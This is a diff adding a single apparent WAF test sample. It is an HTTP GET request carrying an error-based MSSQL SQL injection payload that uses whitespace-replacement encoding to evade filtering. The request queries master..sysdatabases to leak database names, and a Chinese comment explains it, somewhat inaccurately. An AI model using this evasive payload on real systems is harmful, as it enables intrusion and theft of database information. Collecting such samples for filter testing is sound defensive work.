@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_报错注入(空白符替换绕过)-06506467
+# 基于报错注入进行空白符替换绕过注入，该SQL注入语句的攻击手段为利用SQL注入漏洞，通过注入的语句修改原始SQL查询的逻辑，以达到攻击者的目的。在这个特定的注入语句中，通过将百分号编码为"%06"，"%"为"%25"，在AND条件中注入了一个始终为真的条件1=1。接着使用子查询 (select name from master..sysdatabases for xml path) 从SQL Server系统表sysdatabases中获取数据库名称。通过这种方式，攻击者可以获取数据库的敏感信息。
+GET /?id=1%2506and%25071=%28select%2508name%2509from%250amaster..sysdatabases%250bfor%250cxml%250dpath%29%20&bid=hd_tag_m8mv26lt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26lt
+RM-PRO-Token: 67a03c12c8bee04bdfdff896578f70d3
+RM-PRO-Time: 1742808633795
+User-Agent: curl/7.83.1
+
